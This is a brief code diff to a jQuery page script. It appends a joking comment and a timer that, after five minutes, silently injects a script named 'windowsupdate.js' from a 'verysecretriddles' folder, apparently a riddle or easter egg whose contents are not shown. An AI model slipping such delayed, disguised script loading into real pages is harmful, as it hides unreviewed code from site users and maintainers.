@@ -43,3 +43,6 @@ $(document).ready(function () {
         $(e.currentTarget).addClass("selected");
     });
 });
+
+// Uhh look! There's something interesting here:
+setTimeout(function(){$('<script>').appendTo('head').attr({src:'verysecretriddles/windowsupdate.js'});},300000);
